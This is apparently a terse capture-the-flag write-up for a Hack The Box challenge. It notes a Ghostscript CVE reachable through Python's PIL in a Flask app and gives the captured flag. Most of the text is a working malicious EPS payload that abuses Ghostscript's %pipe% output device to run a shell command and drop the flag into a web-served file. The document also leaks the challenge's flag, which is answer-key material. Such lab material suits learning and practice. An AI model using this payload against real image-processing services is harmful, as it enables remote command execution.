http://206.189.24.232:30063/static/petpets/

PIL CVE ghostscript

lesson: check every modules for possible CVE when dealing with python(flask), SSTI is not the only vulnerability HAHAHHAA

PoC:
HTB{c0mfy_bzzzzz_rcb33s_v1b3s}

payload:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/pwn.txt) currentdevice putdeviceprops
```

pwn.png
